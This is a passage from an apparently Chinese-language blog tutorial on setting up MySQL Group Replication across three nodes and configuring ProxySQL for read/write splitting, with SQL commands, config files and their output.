MASTER TO MASTER_USER=<span class="string">'rpl_slave'</span>, MASTER_PASSWORD=<span class="string">'slave@123'</span> FOR CHANNEL <span class="string">'group_replication_recovery'</span>;</span></span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.15 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> INSTALL PLUGIN group_replication SONAME <span class="string">'group_replication.so'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.24 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SHOW PLUGINS;</span></span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">| Name                       | Status   | Type               | Library              | License |</span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">| binlog                     | ACTIVE   | STORAGE ENGINE     | NULL                 | GPL     |</span><br><span class="line">| mysql_native_password      | ACTIVE   | AUTHENTICATION     | NULL                 | GPL     |</span><br><span class="line">| ........................................................................................    |</span><br><span class="line">| group_replication          | ACTIVE   | GROUP REPLICATION  | group_replication.so | GPL     |</span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">46 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> START GROUP_REPLICATION;</span></span><br><span class="line">Query OK, 0 rows affected (5.73 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM performance_schema.replication_group_members;</span></span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| CHANNEL_NAME              | MEMBER_ID                            | MEMBER_HOST | MEMBER_PORT | MEMBER_STATE |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| group_replication_applier | aa4144da-cc7b-11ea-9fc8-000c2916b97f | mgr-node2   |        3306 | ONLINE       |</span><br><span class="line">| group_replication_applier | aa42205a-cc7b-11ea-a8c3-000c29c57992 | mgr-node1   |        3306 | ONLINE       |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看下，发现已经将MGR-node1节点添加的数据同步过来了</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show databases;</span></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| kevin              |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from kevin.haha;</span></span><br><span class="line">+----+-----------+</span><br><span class="line">| id | name      |</span><br><span class="line">+----+-----------+</span><br><span class="line">|  1 | wangshibo |</span><br><span class="line">|  2 | guohuihui |</span><br><span class="line">|  3 | yangyang  |</span><br><span class="line">|  4 | shikui    |</span><br><span class="line">+----+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=====================================================================</span><br><span class="line">3） MGR-node3节点操作</span><br><span class="line">[root@mgr-node3 ~]# cp /etc/my.cnf&#123;,.bak&#125;</span><br><span class="line">[root@mgr-node3 ~]# &gt;/etc/my.cnf</span><br><span class="line">[root@mgr-node3 ~]# cat /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">datadir = /var/lib/mysql</span><br><span class="line">socket = /var/lib/mysql/mysql.sock</span><br><span class="line">      </span><br><span class="line">symbolic-links = 0</span><br><span class="line">      </span><br><span class="line">log-error = /var/log/mysqld.log</span><br><span class="line">pid-file = /var/run/mysqld/mysqld.pid</span><br><span class="line">  </span><br><span class="line"><span class="meta">#</span><span class="bash">GTID:</span></span><br><span class="line">server_id = 3</span><br><span class="line">gtid_mode = on</span><br><span class="line">enforce_gtid_consistency = on</span><br><span class="line">  </span><br><span class="line">master_info_repository=TABLE</span><br><span class="line">relay_log_info_repository=TABLE</span><br><span class="line">binlog_checksum=NONE</span><br><span class="line">      </span><br><span class="line"><span class="meta">#</span><span class="bash">binlog</span></span><br><span class="line">log_bin = mysql-bin</span><br><span class="line">log-slave-updates = 1</span><br><span class="line">binlog_format = row</span><br><span class="line">sync-master-info = 1</span><br><span class="line">sync_binlog = 1</span><br><span class="line">     </span><br><span class="line"><span class="meta">#</span><span class="bash">relay <span class="built_in">log</span></span></span><br><span class="line">skip_slave_start = 1</span><br><span class="line">  </span><br><span class="line">transaction_write_set_extraction=XXHASH64</span><br><span class="line">loose-group_replication_group_name="58462f3b-ccd9-11ea-8eb2-000c29c57992"</span><br><span class="line">loose-group_replication_start_on_boot=off</span><br><span class="line">loose-group_replication_local_address= "192.168.219.153:24901"</span><br><span class="line">loose-group_replication_group_seeds= "192.168.219.151:24901,192.168.219.152:24901,192.168.219.153:24901"</span><br><span class="line">loose-group_replication_bootstrap_group=off</span><br><span class="line">loose-group_replication_single_primary_mode=off</span><br><span class="line">loose-group_replication_enforce_update_everywhere_checks=on</span><br><span class="line">loose-group_replication_ip_whitelist="192.168.219.0/24,127.0.0.1/8"</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">重启mysql服务</span><br><span class="line">[root@mgr-node3 ~]# systemctl restart mysqld</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">登录mysql进行相关设置操作</span><br><span class="line">[root@mgr-node3 ~]# mysql -uroot -p"123456"</span><br><span class="line">..........</span><br><span class="line"><span class="meta">#</span><span class="bash">报错请参考上面</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET SQL_LOG_BIN=0;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT REPLICATION SLAVE ON *.* TO rpl_slave@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'slave@123'</span>;</span></span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> FLUSH PRIVILEGES;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> reset master;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SET SQL_LOG_BIN=1;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CHANGE MASTER TO MASTER_USER=<span class="string">'rpl_slave'</span>, MASTER_PASSWORD=<span class="string">'slave@123'</span> FOR CHANNEL <span class="string">'group_replication_recovery'</span>;</span></span><br><span class="line">Query OK, 0 rows affected, 2 warnings (0.02 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">  INSTALL PLUGIN group_replication SONAME <span class="string">'group_replication.so'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.21 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SHOW PLUGINS;</span></span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">| Name                       | Status   | Type               | Library              | License |</span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">| binlog                     | ACTIVE   | STORAGE ENGINE     | NULL                 | GPL     |</span><br><span class="line">| .......................................................................................     |</span><br><span class="line">| validate_password          | ACTIVE   | VALIDATE PASSWORD  | validate_password.so | GPL     |</span><br><span class="line">| group_replication          | ACTIVE   | GROUP REPLICATION  | group_replication.so | GPL     |</span><br><span class="line">+----------------------------+----------+--------------------+----------------------+---------+</span><br><span class="line">46 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> START GROUP_REPLICATION;</span></span><br><span class="line">Query OK, 0 rows affected (5.91 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM performance_schema.replication_group_members;</span></span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| CHANNEL_NAME              | MEMBER_ID                            | MEMBER_HOST | MEMBER_PORT | MEMBER_STATE |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| group_replication_applier | aa4144da-cc7b-11ea-9fc8-000c2916b97f | mgr-node2   |        3306 | ONLINE       |</span><br><span class="line">| group_replication_applier | aa42205a-cc7b-11ea-a8c3-000c29c57992 | mgr-node1   |        3306 | ONLINE       |</span><br><span class="line">| group_replication_applier | aa9505ca-cc7b-11ea-9854-000c29a39eed | mgr-node3   |        3306 | ONLINE       |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看下，发现已经将在其他节点上添加的数据同步过来了</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> show databases;</span></span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| kevin              |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from kevin.haha;</span></span><br><span class="line">+----+-----------+</span><br><span class="line">| id | name      |</span><br><span class="line">+----+-----------+</span><br><span class="line">|  1 | wangshibo |</span><br><span class="line">|  2 | guohuihui |</span><br><span class="line">|  3 | yangyang  |</span><br><span class="line">|  4 | shikui    |</span><br><span class="line">+----+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=====================================================================</span><br><span class="line">4） 组复制数据同步测试</span><br><span class="line">在任意一个节点上执行</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM performance_schema.replication_group_members;</span></span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| CHANNEL_NAME              | MEMBER_ID                            | MEMBER_HOST | MEMBER_PORT | MEMBER_STATE |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">| group_replication_applier | aa4144da-cc7b-11ea-9fc8-000c2916b97f | mgr-node2   |        3306 | ONLINE       |</span><br><span class="line">| group_replication_applier | aa42205a-cc7b-11ea-a8c3-000c29c57992 | mgr-node1   |        3306 | ONLINE       |</span><br><span class="line">| group_replication_applier | aa9505ca-cc7b-11ea-9854-000c29a39eed | mgr-node3   |        3306 | ONLINE       |</span><br><span class="line">+---------------------------+--------------------------------------+-------------+-------------+--------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">如上，说明已经在MGR-node1、MGR-node2、MGR-node3 三个节点上成功部署了基于GTID的组复制同步环境。</span><br><span class="line">现在在三个节点中的任意一个上面更新数据，那么其他两个节点的数据库都会将新数据同步过去的！</span><br><span class="line"> </span><br><span class="line">1）在MGR-node1节点数据库更新数据</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> delete from kevin.haha <span class="built_in">where</span> id&gt;2;</span></span><br><span class="line">Query OK, 2 rows affected (0.01 sec)</span><br><span class="line"> </span><br><span class="line">接着在MGR-node2、MGR-node3节点数据库查看，发现更新后数据已经同步过来了！</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from kevin.haha;</span></span><br><span class="line">+----+-----------+</span><br><span class="line">| id | name      |</span><br><span class="line">+----+-----------+</span><br><span class="line">|  1 | wangshibo |</span><br><span class="line">|  2 | guohuihui |</span><br><span class="line">+----+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">2）在MGR-node2节点数据库更新数据</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash">  insert into kevin.haha values(11,<span class="string">"beijing"</span>),(12,<span class="string">"shanghai"</span>),(13,<span class="string">"anhui"</span>);</span></span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"> </span><br><span class="line">接着在MGR-node1、MGR-node3节点数据库查看，发现更新后数据已经同步过来了！</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from kevin.haha;</span></span><br><span class="line">+----+-----------+</span><br><span class="line">| id | name      |</span><br><span class="line">+----+-----------+</span><br><span class="line">|  1 | wangshibo |</span><br><span class="line">|  2 | guohuihui |</span><br><span class="line">| 11 | beijing   |</span><br><span class="line">| 12 | shanghai  |</span><br><span class="line">| 13 | anhui     |</span><br><span class="line">+----+-----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"> </span><br><span class="line">3）在MGR-node3节点数据库更新数据</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> update kevin.haha <span class="built_in">set</span> id=100 <span class="built_in">where</span> name=<span class="string">"anhui"</span>;</span></span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"> </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> delete from kevin.haha <span class="built_in">where</span> id=12;</span></span><br><span class="line">Query OK, 1 row affected (0.02 sec)</span><br><span class="line"> </span><br><span class="line">接着在MGR-node1、MGR-node2节点数据库查看，发现更新后数据已经同步过来了！</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from kevin.haha;</span></span><br><span class="line">+-----+-----------+</span><br><span class="line">| id  | name      |</span><br><span class="line">+-----+-----------+</span><br><span class="line">|   1 | wangshibo |</span><br><span class="line">|   2 | guohuihui |</span><br><span class="line">|  11 | beijing   |</span><br><span class="line">| 100 | anhui     |</span><br><span class="line">+-----+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h4 id="四、ProxySQL读写分离和主节点故障无感知切换"><a href="#四、ProxySQL读写分离和主节点故障无感知切换" class="headerlink" title="四、ProxySQL读写分离和主节点故障无感知切换"></a><strong>四、ProxySQL读写分离和主节点故障无感知切换</strong></h4><h5 id="1-安装mysql客户端，用于在本机连接到ProxySQL的管理接口"><a href="#1-安装mysql客户端，用于在本机连接到ProxySQL的管理接口" class="headerlink" title="1) 安装mysql客户端，用于在本机连接到ProxySQL的管理接口"></a><strong>1) 安装mysql客户端，用于在本机连接到ProxySQL的管理接口</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@proxysql-node ~]# yum install -y mariadb</span><br></pre></td></tr></table></figure>

<h5 id="2-安装proxysql"><a href="#2-安装proxysql" class="headerlink" title="2) 安装proxysql"></a><strong>2) 安装proxysql</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">把包全部都下载下来，后面会用到</span></span><br><span class="line">链接：https://pan.baidu.com/s/1Uw37OXlDTOphmabDWlvHug </span><br><span class="line">提取码：feru</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装proxysql</span></span><br><span class="line">[root@proxysql-node ~]# yum install -y proxysql-1.4.8-1-centos7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动proxysql</span></span><br><span class="line">[root@proxysql-node ~]# systemctl start proxysql</span><br><span class="line">[root@proxysql-node ~]# systemctl status proxysql.service </span><br><span class="line">● proxysql.service - LSB: High Performance Advanced Proxy for MySQL</span><br><span class="line">   Loaded: loaded (/etc/rc.d/init.d/proxysql; bad; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu 2020-07-23 20:24:39 CST; 1s ago</span><br><span class="line">     Docs: man:systemd-sysv-generator(8)</span><br><span class="line">  Process: 23727 ExecStart=/etc/rc.d/init.d/proxysql start (code=exited, status=0/SUCCESS)</span><br><span class="line">   CGroup: /system.slice/proxysql.service</span><br><span class="line">           ├─23731 proxysql -c /etc/proxysql.cnf -D /var/lib/proxysql</span><br><span class="line">           └─23732 proxysql -c /etc/proxysql.cnf -D /var/lib/proxysql</span><br><span class="line"></span><br><span class="line">Jul 23 20:24:39 proxysql-node systemd[1]: Starting LSB: High Performance Advanced Prox.....</span><br><span class="line">Jul 23 20:24:39 proxysql-node proxysql[23727]: Starting ProxySQL: DONE!</span><br><span class="line">Jul 23 20:24:39 proxysql-node systemd[1]: Started LSB: High Performance Advanced Proxy...L.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br><span class="line"></span><br><span class="line">[root@proxysql-node ~]# ss -lntp</span><br><span class="line">State       Recv-Q Send-Q Local Address:Port               Peer Address:Port              </span><br><span class="line">LISTEN      0      128               *:6032                          *:*                   users:(("proxysql",pid=23732,fd=23))</span><br><span class="line">LISTEN      0      128               *:6033                          *:*                   users:(("proxysql",pid=23732,fd=22))</span><br><span class="line">LISTEN      0      128               *:6033                          *:*                   users:(("proxysql",pid=23732,fd=21))</span><br><span class="line">LISTEN      0      128               *:6033                          *:*                   users:(("proxysql",pid=23732,fd=20))</span><br><span class="line">LISTEN      0      128               *:6033                          *:*                   users:(("proxysql",pid=23732,fd=19))</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@proxysql-node ~]# mysql -uadmin -p&quot;admin&quot; -h127.0.0.1 -P6032</span><br><span class="line">............</span><br><span class="line">MySQL [(none)]&gt; show databases;</span><br><span class="line">+-----+---------------+-------------------------------------+</span><br><span class="line">| seq | name          | file                                |</span><br><span class="line">+-----+---------------+-------------------------------------+</span><br><span class="line">| 0   | main          |                                     |</span><br><span class="line">| 2   | disk          | &#x2F;var&#x2F;lib&#x2F;proxysql&#x2F;proxysql.db       |</span><br><span class="line">| 3   | stats         |                                     |</span><br><span class="line">| 4   | monitor       |                                     |</span><br><span class="line">| 5   | stats_history | &#x2F;var&#x2F;lib&#x2F;proxysql&#x2F;proxysql_stats.db |</span><br><span class="line">+-----+---------------+-------------------------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">接着初始化Proxysql，将之前的proxysql数据都删除</span></span><br><span class="line">MySQL [(none)]&gt; delete from scheduler ;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; delete from mysql_servers;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; delete from mysql_users;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; delete from mysql_query_rules;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; delete from mysql_group_replication_hostgroups ;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL VARIABLES TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL VARIABLES TO DISK;</span><br><span class="line">Query OK, 94 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL SERVERS TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL SERVERS TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt;  LOAD MYSQL USERS TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL USERS TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD SCHEDULER TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE SCHEDULER TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL QUERY RULES TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL QUERY RULES TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>

<h5 id="3）在数据库端建立proxysql登入需要的帐号-（在三个MGR任意一个节点上操作，会自动同步到其他节点）"><a href="#3）在数据库端建立proxysql登入需要的帐号-（在三个MGR任意一个节点上操作，会自动同步到其他节点）" class="headerlink" title="3）在数据库端建立proxysql登入需要的帐号 （在三个MGR任意一个节点上操作，会自动同步到其他节点）"></a><strong>3）在数据库端建立proxysql登入需要的帐号 （在三个MGR任意一个节点上操作，会自动同步到其他节点）</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mgr-node3 ~]# mysql -uroot -p"123456"</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE USER <span class="string">'proxysql'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'proxysql'</span>;   </span></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT ALL ON * . * TO  <span class="string">'proxysql'</span>@<span class="string">'%'</span>;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> create user <span class="string">'sbuser'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'sbpass'</span>; </span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> GRANT ALL ON * . * TO <span class="string">'sbuser'</span>@<span class="string">'%'</span>; </span></span><br><span class="line">Query OK, 0 rows affected (0.14 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> FLUSH PRIVILEGES;  </span></span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure>

<h5 id="4-创建检查MGR节点状态的函数和视图-（在三个MGR任意一个节点上操作，会自动同步到其他节点）"><a href="#4-创建检查MGR节点状态的函数和视图-（在三个MGR任意一个节点上操作，会自动同步到其他节点）" class="headerlink" title="4) 创建检查MGR节点状态的函数和视图 （在三个MGR任意一个节点上操作，会自动同步到其他节点）"></a><strong>4) 创建检查MGR节点状态的函数和视图 （在三个MGR任意一个节点上操作，会自动同步到其他节点）</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在MGR-node1节点上，创建系统视图sys.gr_member_routing_candidate_status，该视图将为ProxySQL提供组复制相关的监控状态指标。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">下载addition_to_sys.sql脚本，在MGR-node1节点执行如下语句导入MySQL即可 (在mgr-node1节点的mysql执行后，会同步到其他两个节点上)。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">脚本在刚才下载完了，上传就好。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">把addition_to_sys.sql脚本的数据导入到mysql中</span></span><br><span class="line">[root@mgr-node1 ~]# mysql -uroot -p"123456" &lt; /root/addition_to_sys.sql </span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在三个mysql节点上可以查看该视图：</span><br><span class="line">[root@MGR-node1 ~]# mysql -p123456</span><br><span class="line">............</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from sys.gr_member_routing_candidate_status;</span></span><br><span class="line">+------------------+-----------+---------------------+----------------------+</span><br><span class="line">| viable_candidate | read_only | transactions_behind | transactions_to_cert |</span><br><span class="line">+------------------+-----------+---------------------+----------------------+</span><br><span class="line">| YES              | NO        |                   0 |                    0 |</span><br><span class="line">+------------------+-----------+---------------------+----------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<h5 id="5-在proxysql中增加帐号"><a href="#5-在proxysql中增加帐号" class="headerlink" title="5) 在proxysql中增加帐号"></a><strong>5) 在proxysql中增加帐号</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@proxysql-node ~]# mysql -uadmin -padmin -h127.0.0.1 -P6032</span><br><span class="line">..........</span><br><span class="line">MySQL [(none)]&gt;  INSERT INTO MySQL_users(username,password,default_hostgroup) VALUES ('proxysql','proxysql',1);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; UPDATE global_variables SET variable_value='proxysql' where variable_name='mysql-monitor_username';</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; UPDATE global_variables SET variable_value='proxysql' where variable_name='mysql-monitor_password';</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL SERVERS TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL SERVERS TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL VARIABLES TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL VARIABLES TO DISK;</span><br><span class="line">Query OK, 94 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL SERVERS TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL SERVERS TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD MYSQL USERS TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; LOAD SCHEDULER TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE SCHEDULER TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt;  LOAD MYSQL QUERY RULES TO RUNTIME;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SAVE MYSQL QUERY RULES TO DISK;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; delete from mysql_servers;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; insert into mysql_servers (hostgroup_id, hostname, port) values(1,'192.168.219.151',3306);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; insert into mysql_servers (hostgroup_id, hostname, port) values(1,'192.168.219.152',3306);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; insert into mysql_servers (hostgroup_id, hostname, port) values(1,'192.168.219.153',3306);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; insert into mysql_servers (hostgroup_id, hostname, port) values(2,'192.168.219.151',3306);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; insert into mysql_servers (hostgroup_id, hostname, port) values(2,'192.168.219.152',3306);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; insert into mysql_servers (hostgroup_id, hostname, port) values(2,'192.168.219.153',3306);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select * from  mysql_servers ;</span><br><span class="line">+--------------+-----------------+------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname        | port | status | weight | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms 